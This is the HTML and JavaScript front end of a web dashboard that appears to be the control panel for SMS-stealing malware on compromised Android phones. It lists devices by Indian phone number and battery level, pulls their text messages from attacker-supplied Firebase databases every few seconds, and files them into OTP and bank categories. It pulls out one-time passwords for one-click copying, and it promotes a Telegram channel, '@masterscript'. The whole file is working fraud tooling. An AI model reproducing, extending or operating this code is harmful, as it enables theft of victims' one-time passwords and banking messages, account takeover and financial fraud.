            <!-- Device List -->
            <div class="cnt" id="deviceList">
                <div class="sm-empty">
                    <div class="sm-ei"><i class="fas fa-spinner fa-spin" style="color:var(--ink3)"></i></div>
                    <div class="sm-et">Initializing Dashboard...</div>
                </div>
            </div>
        </main>
    </div>

    <!-- ===== SIDE PANEL ===== -->
    <div class="side-overlay" id="sideOverlay" onclick="closeSidePanel()"></div>

    <div class="side-panel" id="sidePanel">
        <div class="side-header">
            <h3><i class="fas fa-cog"></i> Settings</h3>
            <button class="side-close" onclick="closeSidePanel()"><i class="fas fa-times"></i></button>
        </div>
        <div class="side-body">

            <!-- Telegram Section -->
            <div class="telegram-section">
                <span class="tg-icon"><i class="fab fa-telegram-plane"></i></span>
                <h4>Join Our Telegram</h4>
                <p>Get real-time updates, support &amp; exclusive tools.</p>
                <a href="https://t.me/masterscript" target="_blank" class="tg-btn">
                    <i class="fab fa-telegram-plane"></i> @masterscript
                </a>
            </div>

            <!-- Free Line / Masterscript -->
            <div class="free-line">
                <span class="fl-label">
                    <i class="fas fa-star"></i> Free Line
                </span>
                <span class="fl-tag">@masterscript</span>
                <button class="fl-copy" onclick="copyText('@masterscript', 'Copied!')">
                    <i class="fas fa-copy"></i>
                </button>
            </div>

            <!-- Firebase URL Manager -->
            <div class="url-manager">
                <div class="um-header">
                    <span><i class="fas fa-database"></i> Firebase URLs</span>
                    <span style="font-size:12px;font-weight:400;color:var(--ink2);" id="umCount">0</span>
                </div>
                <div class="um-body">
                    <div class="um-add-row">
                        <input type="text" id="umInput" placeholder="https://xxx.firebaseio.com" />
                        <button onclick="addFirebaseUrl()"><i class="fas fa-plus"></i> Add</button>
                    </div>
                    <div id="umToast" class="um-toast"></div>
                    <div class="um-list" id="umList">
                        <div class="um-empty">Loading URLs...</div>
                    </div>
                </div>
            </div>

        </div>
    </div>

    <!-- ===== SMS OVERLAY ===== -->
    <div class="ov" id="ov" onclick="ovClick(event)">
        <div class="modal" id="modal" onclick="event.stopPropagation()">
            <div class="mh">
                <div class="mh-left">
                    <div class="mh-num">
                        <i class="fas fa-mobile-alt" style="color:var(--ink3);font-size:16px;"></i>
                        <span id="mh-num-display"></span>
                    </div>
                    <button class="copy-icon-btn" onclick="copyModalNum()"><i class="fas fa-copy"></i></button>
                </div>
                <button class="close-btn" onclick="closeModal()"><i class="fas fa-times"></i></button>
            </div>
            <div class="mfil">
                <button class="fb act" onclick="setFil('all',this)"><i class="fas fa-envelope"></i> All SMS</button>
                <button class="fb" onclick="setFil('otp',this)"><i class="fas fa-key"></i> OTP</button>
                <button class="fb" onclick="setFil('bank',this)"><i class="fas fa-university"></i> Bank</button>
                <button class="fb" onclick="setFil('promo',this)"><i class="fas fa-gift"></i> Promo</button>
            </div>
            <div class="mlist" id="mlist"></div>
        </div>
    </div>

    <!-- ===== JAVASCRIPT ===== -->
    <script>
        // ============================================================
        //  STATE
        // ============================================================
        let allDevices = [];
        let allSms = [];
        let activeDevice = null;
        let devPollTimer = null;
        let pollTmr = null;
        let smsFil = 'all';
        let firebaseUrls = [];

        // ============================================================
        //  WELCOME POPUP
        // ============================================================
        (function initWelcome() {
            const seen = localStorage.getItem('speedx_welcome_seen');
            if (!seen) {
                document.getElementById('welcomePopup').classList.add('open');
            }
        })();

        function closeWelcome() {
            document.getElementById('welcomePopup').classList.remove('open');
            localStorage.setItem('speedx_welcome_seen', '1');
        }

        // ============================================================
        //  DEVICES
        // ============================================================
        async function loadDevices() {
            try {
                const res = await fetch('?api=devices');
                const json = await res.json();
                if (json.status === 'error') {
                    document.getElementById('deviceList').innerHTML =
                        `<div class="sm-empty"><div class="sm-ei">⚠️</div><div class="sm-et" style="color:var(--red)">${json.message}</div></div>`;
                    return;
                }
                if (json.status === 'success') {
                    allDevices = json.data;
                    renderStats();
                    renderDevices();
                    console.log(`✅ Loaded ${allDevices.length} devices, ${allDevices.filter(d=>d.online).length} online`);
                }
            } catch (e) {
                console.error('Failed to load devices', e);
            }
        }

        function startPolling() {
            if (devPollTimer) clearInterval(devPollTimer);
            devPollTimer = setInterval(() => loadDevices(), 10000);
        }

        // ============================================================
        //  FIXED STATS – show only ONLINE numbers
        // ============================================================
        function renderStats() {
            const onlineCount = allDevices.filter(d => d.online).length;
            document.getElementById('st-nums').textContent = onlineCount;

            const dbs = new Set(allDevices.map(d => d.db_index));
            document.getElementById('st-on').textContent = dbs.size || '0';
        }

        function renderDevices() {
            const q = document.getElementById('srch').value.toLowerCase();
            const list = document.getElementById('deviceList');

            const filtered = allDevices.filter(d =>
                d.name.toLowerCase().includes(q) ||
                (d.rawPhone && d.rawPhone.includes(q)) ||
                d.did.toLowerCase().includes(q)
            );

            if (filtered.length === 0) {
                list.innerHTML =
                    `<div class="sm-empty"><div class="sm-ei">📭</div><div class="sm-et">No online devices found</div></div>`;
                return;
            }

            list.innerHTML = filtered.map(d => {
                const hasPhone = d.rawPhone && d.rawPhone.length === 10;
                const phoneDisplay = hasPhone ? `+91 ${d.rawPhone}` : 'Unknown No.';
                const batClass = batCls(d.battery);
                const batIcon = d.battery >= 80 ? 'full' : (d.battery >= 50 ? 'half' : 'quarter');

                return `
                <div class="ncard" id="card-${d.did}">
                    <div class="ncard-top">
                        <div class="nnum-group">
                            <div class="nnum" id="ph-${d.did}">
                                <i class="fas fa-bolt" style="color:var(--amber);"></i> ${phoneDisplay}
                            </div>
                            <button class="copy-icon-btn" title="Copy number" onclick="copyText('${d.rawPhone || ''}', 'Number Copied!')">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div>
                    <div class="ncard-mid">
                        <span class="ntag"><i class="fas fa-mobile-alt"></i> ${d.name}</span>
                        <span class="nbat ${batClass}"><i class="fas fa-battery-${batIcon}"></i> ${d.battery}%</span>
                        <span class="ntag on"><i class="fas fa-circle" style="font-size:8px;"></i> Online</span>
                    </div>
                    <div class="ncard-btn" onclick="openModal('${d.did}', ${d.db_index})">
                        <div class="ncard-btn-lbl"><i class="fas fa-comment-dots"></i> View SMS</div>
                    </div>
                </div>`;
            }).join('');
        }

        function onSearch() { renderDevices(); }

        // ============================================================
        //  SMS MODAL
        // ============================================================
        async function openModal(did, db_index) {
            activeDevice = allDevices.find(x => x.did === did);
            if (!activeDevice) return;

            document.getElementById('mh-num-display').innerHTML = activeDevice.rawPhone ? `+91 ${activeDevice.rawPhone}` :
                'Unknown No.';
            document.getElementById('ov').classList.add('open');
            allSms = [];

            setFil('all', document.querySelector('.fb'));
            showSkel();

            await fetchSmsForActive(false);

            if (pollTmr) clearInterval(pollTmr);
            pollTmr = setInterval(() => fetchSmsForActive(true), 3500);
        }

        function closeModal() {
            document.getElementById('ov').classList.remove('open');
            if (pollTmr) clearInterval(pollTmr);
            activeDevice = null;
        }

        function ovClick(e) {
            if (e.target === document.getElementById('ov')) closeModal();
        }

        function copyModalNum() {
            if (activeDevice && activeDevice.rawPhone) copyText(activeDevice.rawPhone, 'Number Copied!');
        }

        // ============================================================
        //  ENHANCED SMS FETCH – better OTP extraction
        // ============================================================
        async function fetchSmsForActive(isPolling = false) {
            if (!activeDevice) return;
            try {
                const url = `?api=sms&db_index=${activeDevice.db_index}&did=${activeDevice.did}`;
                const req = await fetch(url);
                const json = await req.json();

                let msgs = [];
                let hasNew = false;

                if (json.status === 'success' && json.data) {
                    const data = json.data;
                    const entries = Array.isArray(data) ? data.map((v, i) => [i, v]) : Object.entries(data);
                    console.log(`📩 Fetched ${entries.length} messages for ${activeDevice.did}`);

                    entries.forEach(([k, m]) => {
                        if (!m) return;

                        // Extract message text – try common fields
                        let text = '';
                        if (typeof m === 'string') {
                            text = m;
                        } else if (typeof m === 'object') {
                            text = m.message || m.body || m.sms || m.text || '';
                        }

                        // Extract sender
                        let sender = 'Unknown';
                        if (typeof m === 'object') {
                            sender = m.sender || m.from || m.address || m.phone || 'Unknown';
                        }

                        // Extract time
                        let time = '';
                        if (typeof m === 'object') {
                            time = m.dateTime || m.date || m.timestamp || '';
                        }

                        let ts = parseMsgDateTime(time);
                        let cat = catSms(text);

                        // ---- IMPROVED OTP DETECTION ----
                        let extractedOtp = '';

                        // 1) Check if there's a dedicated OTP field in the message object
                        if (typeof m === 'object') {
                            const otpField = m.otp || m.code || m.password || m.pin || m.verificationCode;
                            if (otpField && String(otpField).match(/^\d{4,8}$/)) {
                                extractedOtp = String(otpField);
                            }
                        }

                        // 2) If still empty, scan the message body with improved regex
                        if (!extractedOtp && text) {
                            // Look for 4-8 digits, possibly surrounded by word boundaries or common OTP labels
                            const otpRegex = /(?<![A-Za-z0-9])(\d{4,8})(?![A-Za-z0-9])/;
                            const match = text.match(otpRegex);
                            if (match && match[1]) {
                                extractedOtp = match[1];
                            }
                        }

                        // If we found OTP, force category to 'otp'
                        if (extractedOtp) {
                            cat = 'otp';
                        }

                        const existing = allSms.find(s => s.key === k);
                        if (!existing) {
                            if (isPolling) hasNew = true;
                            msgs.push({
                                key: k,
                                text: text,
                                rawText: text,
                                sender: sender,
                                ts: ts,
                                rawTime: time,
                                cat: cat,
                                otpCode: extractedOtp,
                                isNew: isPolling
                            });
                        } else {
                            // Preserve existing, but update OTP if we now detect one
                            if (extractedOtp && !existing.otpCode) {
                                existing.otpCode = extractedOtp;
                                existing.cat = 'otp';
                            }
                            msgs.push(existing);
                        }
                    });
                }

                msgs.sort((a, b) => b.ts - a.ts);
                allSms = msgs;

                if (!isPolling || hasNew) {
                    renderModal();
                }
            } catch (e) {
                console.error('SMS fetch error:', e);
            }
        }

        function setFil(f, btn) {
            smsFil = f;
            document.querySelectorAll('.fb').forEach(b => b.classList.remove('act'));
            if (btn) btn.classList.add('act');
            renderModal();
        }

        function showSkel() {
            document.getElementById('mlist').innerHTML = [1, 2, 3].map(() =>
                `<div class="sk-item"><div class="sk-l"></div><div class="sk-t" style="width:85%"></div><div class="sk-t" style="width:60%"></div></div>`
            ).join('');
        }

        function renderModal() {
            const filtered = smsFil === 'all' ? allSms : allSms.filter(s => s.cat === smsFil);
            const list = document.getElementById('mlist');

            if (!filtered.length) {
                list.innerHTML =
                    `<div class="sm-empty"><i class="fas fa-inbox sm-ei" style="opacity:0.3;"></i><div class="sm-et">No messages found</div></div>`;
                return;
            }

            list.innerHTML = filtered.map(s => {
                let copyContent = s.cat === 'otp' && s.otpCode ? s.otpCode : s.rawText;
                let copyLabel = s.cat === 'otp' && s.otpCode ? 'Copy OTP' : 'Copy Message';
                let copyIcon = s.cat === 'otp' && s.otpCode ? 'fa-key' : 'fa-copy';

                return `
                <div class="si ${s.cat}">
                    ${s.isNew ? '<div class="new-b">New</div>' : ''}
                    <div class="si-h">
                        <span class="si-sender"><i class="fas fa-user-circle" style="color:var(--ink3);"></i> ${s.sender}</span>
                        <span class="si-time">${fmtTs(s.rawTime)}</span>
                    </div>
                    <div class="si-body">${hlOtp(s.text, s.otpCode)}</div>
                    <div class="si-actions">
                        <button class="si-copy" onclick='copyText(${JSON.stringify(copyContent)}, "${copyLabel} Copied!")'>
                            <i class="fas ${copyIcon}"></i> ${copyLabel}
                        </button>
                    </div>
                </div>`;
            }).join('');
        }

        // ============================================================
        //  UTILITY FUNCTIONS
        // ============================================================
        function catSms(t) {
            if (!t) return 'other';
            const s = t.toLowerCase();
            if (/otp|one.?time|verify|code|pin|passcode|password/.test(s)) return 'otp';
            if (/bank|account|debit|credit|balance|transaction|upi|\brs\b|inr|withdraw|transfer|neft|imps|atm/.test(s))
                return 'bank';
            if (/offer|discount|cashback|sale|deal|promo|win|prize|free|reward/.test(s)) return 'promo';
            if (/urgent|alert|spam|click|http|www\./.test(s)) return 'spam';
            return 'other';
        }

        // Enhanced highlight: shows OTP in code tag
        function hlOtp(text, otpCode) {
            let escaped = String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
            if (otpCode) {
                // Highlight the OTP code in the message
                const regex = new RegExp(`(?<![A-Za-z0-9])${otpCode}(?![A-Za-z0-9])`, 'g');
                escaped = escaped.replace(regex, `<code>${otpCode}</code>`);
            } else {
                // Fallback: try to highlight any 4-8 digit numbers
                escaped = escaped.replace(/(?<![A-Za-z0-9])(\d{4,8})(?![A-Za-z0-9])/g, (m, v) =>
                    (/\d/.test(v) || v.length <= 6) ? `<code>${v}</code>` : v
                );
            }
            return escaped;
        }

        function parseMsgDateTime(dt) {
            if (!dt) return Date.now();
            const s = String(dt).trim();
            if (/^\d{10,13}$/.test(s)) return parseInt(s.length === 13 ? s : s + '000');
            const m1 = s.match(
                /(\d{1,2})[\-\/\.](\d{1,2})[\-\/\.](\d{4}).*?(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(am|pm)?/i);
            if (m1) {
                let h = +m1[4],
                    mn = +m1[5];
                const ap = (m1[7] || '').toLowerCase();
                if (ap === 'pm' && h < 12) h += 12;
                if (ap === 'am' && h === 12) h = 0;
                return new Date(+m1[3], +m1[2] - 1, +m1[1], h, mn, 0).getTime();
            }
            const d = new Date(s);
            return isNaN(d.getTime()) ? Date.now() : d.getTime();
        }

        function fmtTs(raw) {
            if (!raw) return '';
            const ts = parseMsgDateTime(raw);
            const d = new Date(ts);
            const now = new Date();
            const isToday = d.getDate() === now.getDate() &&
                d.getMonth() === now.getMonth() &&
                d.getFullYear() === now.getFullYear();
            if (isToday) {
                return d.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true });
            } else {
                return d.toLocaleDateString('en-IN', { day: '2-digit', month: 'short' });
            }
        }

        function batCls(b) {
            const n = parseInt(b);
            return isNaN(n) ? '' : n < 20 ? 'lo' : n < 50 ? 'md' : 'hi';
        }

        function copyText(txt, label = 'Copied') {
            if (!txt || txt === 'Unknown No.') return;
            navigator.clipboard.writeText(txt).then(() => {
                let tip = document.querySelector('.copied-tip');
                if (tip) tip.remove();
                tip = document.createElement('div');
                tip.className = 'copied-tip';
                tip.innerHTML = '<i class="fas fa-check-circle" style="color:#4ade80;"></i> ' + label;
                document.body.appendChild(tip);
                setTimeout(() => tip.remove(), 1600);
            }).catch(() => {
                // Fallback
                const ta = document.createElement('textarea');
                ta.value = txt;
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                ta.remove();
                alert('Copied: ' + txt);
            });
        }

        // ============================================================
        //  SIDE PANEL
        // ============================================================
        function openSidePanel() {
            document.getElementById('sidePanel').classList.add('open');
            document.getElementById('sideOverlay').classList.add('open');
            loadFirebaseUrlsUI();
        }

        function closeSidePanel() {
            document.getElementById('sidePanel').classList.remove('open');
            document.getElementById('sideOverlay').classList.remove('open');
        }

        // ============================================================
        //  FIREBASE URL MANAGER (AJAX)
        // ============================================================
        async function loadFirebaseUrlsUI() {
            try {
                const res = await fetch('?ajax=urls&url_action=list');
                const json = await res.json();
                if (json.status === 'success') {
                    firebaseUrls = json.urls;
                    renderUrlList();
                }
            } catch (e) {
                console.error('Failed to load URLs', e);
            }
        }

        function renderUrlList() {
            const list = document.getElementById('umList');
            const count = document.getElementById('umCount');
            count.textContent = firebaseUrls.length;

            if (!firebaseUrls.length) {
                list.innerHTML = `<div class="um-empty">No Firebase URLs added yet.</div>`;
                return;
            }

            list.innerHTML = firebaseUrls.map((url, idx) => `
                <div class="um-item">
                    <span class="um-url" title="${url}">${url}</span>
                    <button class="um-del" onclick="deleteFirebaseUrl(${idx})">
                        <i class="fas fa-trash-alt"></i>
                    </button>
                </div>
            `).join('');
        }

        async function addFirebaseUrl() {
            const input = document.getElementById('umInput');
            const url = input.value.trim();
            const toast = document.getElementById('umToast');

            if (!url) {
                toast.textContent = 'Please enter a URL';
                toast.className = 'um-toast error';
                return;
            }

            try {
                const res = await fetch(`?ajax=urls&url_action=add&url=${encodeURIComponent(url)}`);
                const json = await res.json();
                if (json.status === 'success') {
                    firebaseUrls = json.urls;
                    renderUrlList();
                    input.value = '';
                    toast.textContent = '✅ URL added successfully!';
                    toast.className = 'um-toast';
                    loadDevices();
                } else {
                    toast.textContent = '❌ ' + (json.message || 'Invalid URL');
                    toast.className = 'um-toast error';
                }
            } catch (e) {
                toast.textContent = '❌ Network error';
                toast.className = 'um-toast error';
            }
        }

        async function deleteFirebaseUrl(index) {
            if (!confirm('Delete this Firebase URL?')) return;
            const toast = document.getElementById('umToast');
            try {
                const res = await fetch(`?ajax=urls&url_action=delete&index=${index}`);
                const json = await res.json();
                if (json.status === 'success') {
                    firebaseUrls = json.urls;
                    renderUrlList();
                    toast.textContent = '🗑️ URL deleted.';
                    toast.className = 'um-toast';
                    loadDevices();
                } else {
                    toast.textContent = '❌ ' + (json.message || 'Delete failed');
                    toast.className = 'um-toast error';
                }
            } catch (e) {
                toast.textContent = '❌ Network error';
                toast.className = 'um-toast error';
            }
        }

        // ============================================================
        //  KEYBOARD SHORTCUTS
        // ============================================================
        document.addEventListener('keydown', e => {
            if (e.key === 'Escape') {
                closeModal();
                closeSidePanel();
            }
        });

        // ============================================================
        //  INIT
        // ============================================================
        loadDevices();
        startPolling();

        // Close side panel on outside click
        document.getElementById('sideOverlay').addEventListener('click', closeSidePanel);

        // Allow Enter key on URL input
        document.getElementById('umInput').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') addFirebaseUrl();
        });
    </script>